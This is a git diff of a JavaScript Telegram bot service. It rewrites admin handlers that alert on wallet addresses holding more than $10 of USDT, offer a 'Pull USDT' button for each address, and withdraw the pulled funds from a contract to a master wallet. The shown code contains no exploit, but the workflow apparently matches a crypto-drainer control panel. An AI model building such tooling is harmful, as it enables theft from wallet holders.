@@ -400,111 +400,79 @@ Actions:
         }
     }
 
-    // Helper function to escape MarkdownV2 special characters
-escapeMarkdown(text) {
-    if (!text) return '';
-    return text.toString().replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
-}
-
-async sendBalanceAlert(walletAddress, balance) {
-    if (!this.bot || !this.adminChatId) return;
-    
-    const escapedAddress = this.escapeMarkdown(walletAddress);  // Escape the wallet address
-    const escapedBalance = this.escapeMarkdown(balance);        // Escape the balance
-    
-    const message = `
+    async sendBalanceAlert(walletAddress, balance) {
+        if (!this.bot || !this.adminChatId) return;
+        
+        const escapedAddress = this.escapeMarkdown(walletAddress);
+        const escapedBalance = this.escapeMarkdown(balance);
+        
+        const message = `
 💰 *BALANCE ALERT*
 Address: \`${escapedAddress}\`
-USDT Balance: *${escapedBalance} USDT* (> \$10)
-
-Actions:
-    `;
-
-    const options = {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
-                ],
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
-                ]
-            ]
-        }
-    };
-
-    try {
-        return await this.bot.sendMessage(this.adminChatId, message, options);
-    } catch (error) {
-        console.error('Error sending balance alert:', error.message);
-        const fallbackMessage = `
-💰 BALANCE ALERT
-Address: ${escapedAddress}
-USDT Balance: ${escapedBalance} USDT (> $10)
+USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)
 
 Actions:
         `;
-        return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+        
+        const options = {
+            parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
+                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                     ],
                     [
                         { text: '🏠 Main Menu', callback_data: 'menu' }
                     ]
                 ]
             }
-        });
+        };
+        
+        try {
+            return await this.bot.sendMessage(this.adminChatId, message, options);
+        } catch (error) {
+            console.error('Error sending balance alert:', error.message);
+            // Fallback without markdown
+            const fallbackMessage = `
+💰 BALANCE ALERT
+Address: ${walletAddress}
+USDT Balance: ${balance} USDT (> $10)
+
+Actions:
+            `;
+            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
+                        ],
+                        [
+                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                        ]
+                    ]
+                }
+            });
+        }
     }
-}
 
-
-    // Inside sendSuccessMessage function, remove the nested try-catch
-async sendSuccessMessage(walletAddress, amount, txHash) {
-    if (!this.bot || !this.adminChatId) return;
-    
-    const escapedAddress = this.escapeMarkdown(walletAddress);  // Escape wallet address
-    const escapedAmount = this.escapeMarkdown(amount);          // Escape amount
-    const escapedTxHash = this.escapeMarkdown(txHash);          // Escape transaction hash
-    
-    const message = `
+    async sendSuccessMessage(walletAddress, amount, txHash) {
+        if (!this.bot || !this.adminChatId) return;
+        
+        const escapedAddress = this.escapeMarkdown(walletAddress);
+        const escapedAmount = this.escapeMarkdown(amount);
+        const escapedTxHash = this.escapeMarkdown(txHash);
+        
+        const message = `
 ✅ *SUCCESSFUL PULL*
 Address: \`${escapedAddress}\`
 Amount: *${escapedAmount} USDT*
 Transaction: \`${escapedTxHash}\`
 
 Next steps:
-    `;
-
-    const options = {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
-                ],
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
-                ]
-            ]
-        }
-    };
-
-    try {
-        return await this.bot.sendMessage(this.adminChatId, message, options);
-    } catch (error) {
-        console.error('Error sending success message:', error.message);
-        const fallbackMessage = `
-✅ SUCCESSFUL PULL
-Address: ${escapedAddress}
-Amount: ${escapedAmount} USDT
-Transaction: ${escapedTxHash}
-
-Next steps:
         `;
-        return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+        
+        const options = {
+            parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -515,11 +483,35 @@ Next steps:
                     ]
                 ]
             }
-        });
-    }
-}
+        };
+        
+        try {
+            return await this.bot.sendMessage(this.adminChatId, message, options);
+        } catch (error) {
+            console.error('Error sending success message:', error.message);
+            // Fallback without markdown
+            const fallbackMessage = `
+✅ SUCCESSFUL PULL
+Address: ${walletAddress}
+Amount: ${amount} USDT
+Transaction: ${txHash}
 
-// Other blocks like sendPullWalletList, handleWithdrawCommand, handleBalancesCommand, etc., should follow similar structure
+Next steps:
+            `;
+            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
+                        ],
+                        [
+                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                        ]
+                    ]
+                }
+            });
+        }
+    }
 
     async sendPullWalletList(chatId) {
         if (chatId.toString() !== this.adminChatId) {
@@ -646,7 +638,7 @@ Failed to fetch wallet list. Please try again later.
             return { balance: formattedBalance, error: null };
         } catch (error) {
             console.error('Error getting master wallet USDT balance:', error.message);
-            return { balance: '0.00', error: error.message };
+            return  { balance: '0.00', error: error.message };
         }
     }
 
@@ -734,10 +726,6 @@ The pull operation is ready to be implemented with real blockchain integration\\
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
-        const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
-        const escapedContractAddress = this.escapeMarkdown(contractAddress);
-        const escapedMasterWallet = this.escapeMarkdown(this.masterWallet);
-        
         const processingMessage = `
 🏦 *Withdraw Operation Initiated*
 Withdrawing all USDT from contract to master wallet\\.\\.\\.
@@ -764,97 +752,24 @@ Withdrawing all USDT from contract to master wallet\\.\\.\\.
         try {
             const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
             
-            // In a real implementation, this would trigger actual blockchain operations
-            setTimeout(async () => {
-                const infoMessage = `
-🏦 *Withdraw Operation Status*
-
-ℹ️ *Operation Details:*
-• Contract address: \`${escapedContractAddress}\`
-• Master wallet: \`${escapedMasterWallet}\`
-• Transaction signing: Ready for integration
-
-✅ *Next Steps:*
-The withdraw operation is ready to be implemented with real blockchain integration\\. This requires:
-• Smart contract interaction
-• Transaction signing with master wallet
-• Gas management
-
-🔧 *Current Status:* Implementation pending
-                `;
+            // Import the contract service
+            const contractService = require('../services/contract.service');
+            
+            // Execute the actual withdrawal
+            const withdrawResult = await contractService.withdrawUSDTToMaster();
+            
+            if (withdrawResult.success) {
+                // Mask addresses for security
+                const maskAddress = (address) => {
+                    if (!address || address.length < 10) return 'Invalid Address';
+                    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+                };
                 
-                await this.bot.sendMessage(chatId, infoMessage, {
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '📊 Check Balances', callback_data: 'balances' },
-                                { text: '🏠 Main Menu', callback_data: 'menu' }
-                            ]
-                        ]
-                    }
-                });
-            }, 3000); // 3 second delay
-            
-            return result;
-        } catch (error) {
-            console.error('Error in withdraw command:', error.message);
-            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    }
-
-// In backend/src/config/telegram.js, replace the handleWithdrawCommand function with this:
-
-async handleWithdrawCommand(chatId) {
-    if (chatId.toString() !== this.adminChatId) {
-        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-    }
-    
-    const processingMessage = `
-🏦 *Withdraw Operation Initiated*
-Withdrawing all USDT from contract to master wallet\\.\\.\\.
-
-📋 *Operations to perform:*
-• Check contract USDT balance
-• Execute withdrawal transaction
-• Send confirmation
-
-⏳ *Please wait*\\.\\.\\.
-    `;
-    
-    const processingOptions = {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
-                ]
-            ]
-        }
-    };
-    
-    try {
-        const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-        
-        // Import the contract service
-        const contractService = require('../services/contract.service');
-        
-        // Execute the actual withdrawal
-        const withdrawResult = await contractService.withdrawUSDTToMaster();
-        
-        if (withdrawResult.success) {
-            // Mask addresses for security
-            const maskAddress = (address) => {
-                if (!address || address.length < 10) return 'Invalid Address';
-                return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-            };
-            
-            const maskedContractAddress = maskAddress(process.env.CONTRACT_ADDRESS || 'Not set');
-            const maskedMasterWallet = maskAddress(this.masterWallet);
-            const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
-            const escapedTxHash = this.escapeMarkdown(withdrawResult.txHash || 'N/A');
-            
-            const successMessage = `
+                const maskedMasterWallet = maskAddress(this.masterWallet);
+                const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
+                const escapedTxHash = this.escapeMarkdown(withdrawResult.txHash || 'N/A');
+                
+                const successMessage = `
 ✅ *WITHDRAWAL SUCCESSFUL*
 Amount: *${escapedAmount} USDT*
 To: \`${maskedMasterWallet}\`
@@ -865,23 +780,47 @@ Transaction: \`${escapedTxHash}\`
 • Master Wallet USDT: Check balances for update
 
 🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
-            `;
-            
-            await this.bot.sendMessage(chatId, successMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                `;
+                
+                await this.bot.sendMessage(chatId, successMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
                         ]
-                    ]
-                }
-            });
-        } else {
-            const errorMessage = `
+                    }
+                });
+            } else {
+                const errorMessage = `
 ❌ *WITHDRAWAL FAILED*
 Error: ${this.escapeMarkdown(withdrawResult.error || 'Unknown error occurred')}
+
+🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+                `;
+                
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            }
+            
+            return result;
+        } catch (error) {
+            console.error('Error in withdraw command:', error);
+            
+            const errorMessage = `
+❌ *WITHDRAWAL FAILED*
+Error: ${this.escapeMarkdown(error.message || 'Unknown error occurred')}
 
 🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
             `;
@@ -897,34 +836,126 @@ Error: ${this.escapeMarkdown(withdrawResult.error || 'Unknown error occurred')}
                     ]
                 }
             });
+            
+            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
+    }
+
+    async handleBalancesCommand(chatId) {
+        if (chatId.toString() !== this.adminChatId) {
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
-        return result;
-    } catch (error) {
-        console.error('Error in withdraw command:', error);
-        
-        const errorMessage = `
-❌ *WITHDRAWAL FAILED*
-Error: ${this.escapeMarkdown(error.message || 'Unknown error occurred')}
+        const processingMessage = `
+📊 *Fetching Real Balances*
 
-🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+📋 *Balance Checks:*
+• Smart Contract USDT Balance
+• Master Wallet BNB Balance
+• Master Wallet USDT Balance
+
+⏳ *Querying blockchain*\\.\\.\\.
         `;
         
-        await this.bot.sendMessage(chatId, errorMessage, {
+        const processingOptions = {
             parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: '📊 Check Balances', callback_data: 'balances' },
                         { text: '🏠 Main Menu', callback_data: 'menu' }
                     ]
                 ]
             }
-        });
+        };
         
-        return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        try {
+            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+            
+            // Fetch real balances
+            const contractBalance = await this.getContractUSDTBalance();
+            const masterBNBBalance = await this.getMasterWalletBNBBalance();
+            const masterUSDTBalance = await this.getMasterWalletUSDTBalance();
+            
+            // Helper function to mask addresses
+            const maskAddress = (address) => {
+                if (!address || address.length < 10) return 'Invalid Address';
+                return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+            };
+            
+            // Format the real balances message
+            setTimeout(async () => {
+                const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
+                const maskedContractAddress = maskAddress(contractAddress);
+                const maskedMasterWallet = maskAddress(this.masterWallet);
+                const escapedContractBalance = this.escapeMarkdown(contractBalance.balance || '0');
+                const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance.balance || '0');
+                const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance.balance || '0');
+                
+                let balancesMessage = `
+📊 *REAL BALANCE REPORT*
+
+`;
+                
+                // Contract USDT Balance
+                if (process.env.CONTRACT_ADDRESS) {
+                    balancesMessage += `
+💰 *Smart Contract*
+• Address: \`${maskedContractAddress}\`
+• USDT Balance: *${escapedContractBalance} USDT*
+`;
+                    if (contractBalance.error) {
+                        balancesMessage += `• ⚠️ Error: ${this.escapeMarkdown(contractBalance.error)}\n`;
+                    }
+                } else {
+                    balancesMessage += `
+💰 *Smart Contract*
+• Address: Not configured
+• USDT Balance: 0\\.00 USDT
+`;
+                }
+                
+                // Master Wallet Balances
+                balancesMessage += `
+🏦 *Master Wallet*
+• Address: \`${maskedMasterWallet}\`
+• BNB Balance: *${escapedBNBBalance} BNB*
+• USDT Balance: *${escapedUSDTBalance} USDT*
+`;
+                
+                if (masterBNBBalance.error) {
+                    balancesMessage += `• ⚠️ BNB Error: ${this.escapeMarkdown(masterBNBBalance.error)}\n`;
+                }
+                if (masterUSDTBalance.error) {
+                    balancesMessage += `• ⚠️ USDT Error: ${this.escapeMarkdown(masterUSDTBalance.error)}\n`;
+                }
+                
+                balancesMessage += `
+🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+`;
+                
+                await this.bot.sendMessage(chatId, balancesMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                                { text: '📥 Withdraw', callback_data: 'withdraw' }
+                            ],
+                            [
+                                { text: '🔄 Refresh Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            }, 2000); // 2 second delay to simulate processing
+            
+            return result;
+        } catch (error) {
+            console.error('Error in balances command:', error);
+            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
     }
-}
 
     // Process webhook updates manually
     async processUpdate(update) {
@@ -940,10 +971,3 @@ Error: ${this.escapeMarkdown(error.message || 'Unknown error occurred')}
 }
 
 module.exports = new TelegramService();
-
-
-
-
-
-
-
